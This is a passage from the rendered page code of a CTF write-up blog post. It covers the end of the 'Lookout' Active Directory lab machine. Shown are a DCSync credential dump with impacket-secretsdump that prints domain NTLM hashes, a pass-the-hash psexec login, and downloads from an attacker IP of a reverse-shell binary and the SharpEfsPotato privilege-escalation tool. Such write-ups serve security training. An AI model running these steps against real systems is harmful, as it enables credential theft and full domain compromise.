base64(ticket.kirbi):\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`      doIF3jCCBdqgA\u003cSNIIIIIIIIIP\u003eAWoAMCAQGFM\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"I\\u2019ll save to my local machine and convert the ticket with \",(0,e.jsx)(n.code,{children:\"TicketConverter\"}),\" from \",(0,e.jsx)(n.code,{children:\"impacket\"}),\".\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp/wr \\xBB cat ticket| base64 -d \u003e ticket.kirbi\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp/wr \\xBB impacket-ticketConverter ticket.kirbi ticket.ccache\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] converting kirbi to ccache...\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] done\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Then I\\u2019ll export it to my env variables.\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp/wr \\xBB export KRB5CCNAME=/tmp/wr/ticket.ccache\n`})})}),`\n`,(0,e.jsx)(n.p,{children:\"One last thing, we need to synchronize our local time to the server, otherwise it won\\u2019t work.\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`sudo ntpdate 10.129.254.249\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Now to perform a DCSync on the target, we can use impacket\\u2019s \",(0,e.jsx)(n.code,{children:\"secretsdump.py\"}),\" script to extract all the hashes from the domain controller. We need to specify kerberos authentication and no password for this operation.\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp/wr \\xBB impacket-secretsdump LOOKOUT-DC.LOOKOUT.local -dc-ip 10.129.254.249 -no-pass -k\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Dumping Domain Credentials (domain\\\\uid:rid:lmhash:nthash)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Using the DRSUAPI method to get NTDS.DIT secrets\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Administrator:500:aad3b435b51404eeaad3b435b51404ee:cb313353c5eaceb1aae589b1644737bb:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ab92b60e75818bbb70ca754897aa1e37:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`LOOKOUT.local\\\\lhuman:1104:aad3b435b51404eeaad3b435b51404ee:de9ca94a6f5ea9113d3370476e42a9cb:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`LOOKOUT.local\\\\fhuman:1105:aad3b435b51404eeaad3b435b51404ee:1501f896cae1fd4f0bf6b9593e81dea3:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`LOOKOUT.local\\\\shuman:1106:aad3b435b51404eeaad3b435b51404ee:f4c0320c516b4eeae0533e930beee3c3:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`LOOKOUT-DC$:1001:aad3b435b51404eeaad3b435b51404ee:440f42cdda7c8d86dedc9655e8c003d0:::\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\u003cSNIP\u003e\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Now with the administrator hash we can \",(0,e.jsx)(n.code,{children:\"psexec\"}),\" into the machine:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/tmp/wr \\xBB impacket-psexec Administrator@10.129.254.249 -hashes :cb313353c5eaceb1aae589b1644737bb     1 \\u21B5\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Requesting shares on 10.129.254.249.....\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Found writable share ADMIN$\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Uploading file HeqMQBmt.exe\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Opening SVCManager on 10.129.254.249.....\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Creating service bqIM on 10.129.254.249.....\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Starting service bqIM.....\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[!] Press help for extra shell commands\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Microsoft Windows [Version 10.0.17763.3650]\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`(c) 2018 Microsoft Corporation. All rights reserved.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`C:\\\\Windows\\\\system32\u003e whoami\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`nt authority\\\\system\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And then we grab both flags :D!\"}),`\n`,(0,e.jsxs)(n.h4,{id:\"second-way\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#second-way\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Second Way\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`PS C:\\\\Windows\\\\system32\u003e whoami /priv\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`whoami /priv\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`PRIVILEGES INFORMATION\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`----------------------\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Privilege Name                Description                               State\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`============================= ========================================= ========\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeMachineAccountPrivilege     Add workstations to domain                Disabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeImpersonatePrivilege        Impersonate a client after authentication Enabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeCreateGlobalPrivilege       Create global objects                     Enabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We have \",(0,e.jsx)(n.code,{children:\"SeImpersonatePrivilege\"}),\" Enabled. Since this is a Windows Server 2019, most of the known Potatos will not work. But likely, there is new potato that could exploit \",(0,e.jsx)(n.code,{children:\"SEimpersonatePrivilege\"}),\" using \",(0,e.jsx)(n.code,{children:\"EfsRpc\"}),\".\"]}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.a,{href:\"https://github.com/bugch3ck/SharpEfsPotato\",children:\"https://github.com/bugch3ck/SharpEfsPotato\"})}),`\n`]}),`\n`,(0,e.jsx)(n.p,{children:\"We compile it with Visual Studio and upload it to the remote machine:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`PS C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\u003e wget 10.10.14.57/xc_10.10.14.57_443.exe -o xc_10.10.14.57_443.exe\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`PS C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\u003e wget 10.10.14.57/SharpEfsPotato.exe -o SharpEfsPotato.exe\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And then execute my reverse shell:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`PS C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\u003e .\\\\SharpEfsPotato.exe -p C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\xc_10.10.14.57_443.exe\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`SharpEfsPotato by @bugch3ck\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Triggering name pipe access on evil PIPE \\\\\\\\localhost/pipe/d112edc0-75de-4d57-8696-f7b9847761a6/\\\\d112edc0-75de-4d57-8696-f7b9847761a6\\\\d112edc0-75de-4d57-8696-f7b9847761a6\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[x]RpcBindingSetAuthInfo failed with status 0x6d3\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Server connected to our evil RPC pipe\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Duplicated impersonation token ready for process creation\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Intercepted and authenticated successfully, launching program\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Process created, enjoy!\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And I grabbed my shell:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:/opt/xc(master\\u25CB) \\xBB ./xc -l -p 443                                                                                                                                                                                            1 \\u21B5\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\t\t__  _____\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\t\t\\\\ \\\\/ / __|\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\t\t\u003e  \u003c (__\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\t\t/_/\\\\_\\\\___| by @xct_de\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\t\t           build: XBWQOEYPUG\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 09:05:16 Listening on :443\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 09:05:16 Waiting for connections...\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 09:07:06 Connection from 10.129.254.249:63732\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 09:07:06 Stream established\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Auto-Plugins:\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[xc: C:\\\\Windows\\\\system32]: whoami\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`nt authority\\\\system\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[xc: C:\\\\Windows\\\\system32]: hostname\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`LOOKOUT-DC\n`})]})})]})}}var w=f;return y;})();\n;return Component;","toc":[{"value":"BeautyCare (Fullpwn, 2000 Points)","url":"#beautycare-fullpwn-2000-points","depth":2},{"value":"Enumeration","url":"#enumeration","depth":3},{"value":"Exploitation","url":"#exploitation","depth":3},{"value":"Privilege Escalation","url":"#privilege-escalation","depth":3},{"value":"Electrogrid (Fullpwn, 2000 Points)","url":"#electrogrid-fullpwn-2000-points","depth":2},{"value":"Enumeration","url":"#enumeration","depth":3},{"value":"BONUS PART - Running GUI app","url":"#bonus-part---running-gui-app","depth":3},{"value":"Exploitation","url":"#exploitation","depth":3},{"value":"Privilege Escalation","url":"#privilege-escalation","depth":3},{"value":"Lookout (Fullpwn, 2000 Points)","url":"#lookout-fullpwn-2000-points","depth":2},{"value":"Enumeration","url":"#enumeration","depth":3},{"value":"Exploitation","url":"#exploitation","depth":3},{"value":"Privilege Escalation","url":"#privilege-escalation","depth":3},{"value":"First Way","url":"#first-way","depth":4},{"value":"Second Way","url":"#second-way","depth":4}],"frontMatter":{"readingTime":{"text":"32 min read","minutes":31.975,"time":1918500,"words":6395},"slug":"stack-the-flags-2022/fullpwn","fileName":"stack-the-flags-2022/fullpwn.md","title":"STACK The Flags 2022 Open – Fullpwn","date":"2022-12-05T00:00:00.000Z","draft":false,"authors":["elleuch"],"tags":["STACK The Flags 2022","fullpwn","Electron","XSS","RCE","Selenium","HackTheBox"],"summary":"Fullpwn Solutions from STACK The Flags CTF"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.19,"time":11400,"words":38},"slug":["elleuch"],"fileName":"elleuch.md","name":"ElleuchX1","avatar":"https://www.gravatar.com/avatar/7713c4f4229ca2e9b9291755957a2e42?d=identicon\u0026s=256","specialties":["Web","boot2root"],"member":true,"description":"Yeah exactly, the HTB guy","order":7,"date":null}],"prev":{"title":"GDG Algiers CTF 2022 – MLM","date":"2022-10-09T00:00:00.000Z","draft":false,"authors":["sahuang"],"tags":["GDG Algiers 2022","Misc","Forensics","pcapng","AI","Bert"],"summary":"Analyze pcapng for BERT layer data, then predict flag with Masked Language Modelling.","canonical":"https://sahuang.github.io/writeups/gdg-algiers-ctf-2022","slug":"gdg-algiers-2022/mlm"},"next":{"title":"idekCTF 2022* – NMPZ","date":"2023-01-15T00:00:00.000Z","draft":false,"authors":["enscribe"],"tags":["idekCTF 2022*","OSINT","GeoGuessr"],"summary":"“No moving, panning, or zooming”—a GeoGuessr-style challenge testing geographical literacy.","canonical":"https://enscribe.dev/ctfs/idek/osint/nmpz/","slug":"idekctf-2022/nmpz"}},"__N_SSG":true},"page":"/blog/[...slug]","query":{"slug":["stack-the-flags-2022","fullpwn"]},"buildId":"zs4rZRwOZcgSj8qsc8Zvy","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>